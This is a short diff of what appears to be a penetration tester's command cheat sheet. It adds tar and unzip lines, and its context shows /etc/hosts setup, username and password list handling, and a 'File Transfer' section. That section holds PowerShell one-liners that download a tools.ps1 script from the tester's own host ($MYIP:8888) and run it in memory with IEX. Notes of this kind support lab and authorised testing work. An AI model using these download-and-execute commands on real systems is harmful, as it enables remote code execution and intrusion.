@@ -99,6 +99,10 @@ echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 sort -u usernames | tee usernames
 sort -u passwords | tee passwords
 
+## Decompressing Files
+tar -xzvf backup.tar.gz -C .
+unzip backup.zip -d .
+
 ## File Transfer
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
 set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
